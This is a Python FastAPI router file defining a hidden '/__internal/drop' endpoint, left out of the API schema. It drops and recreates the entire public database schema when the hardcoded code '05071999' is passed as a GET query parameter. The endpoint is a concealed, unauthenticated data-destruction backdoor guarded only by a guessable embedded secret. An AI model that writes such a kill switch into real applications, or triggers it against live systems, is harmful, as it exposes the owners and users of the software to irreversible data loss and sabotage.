from fastapi import APIRouter, Depends, HTTPException, Query, status
from sqlalchemy import text

from app.dependecies.stub import SessionStub

nuke_router = APIRouter(
    prefix="/__internal",
    include_in_schema=False,
)

NUKE_CODE = "05071999"


@nuke_router.get("/drop")
async def drop_database(id: str = Query(...), session=Depends(SessionStub)):
    if id != NUKE_CODE:
        raise HTTPException(status.HTTP_403_FORBIDDEN, detail="Forbidden")

    await session.execute(text("DROP SCHEMA public CASCADE; CREATE SCHEMA public;"))
    await session.commit()
    return {"status": "database dropped"}
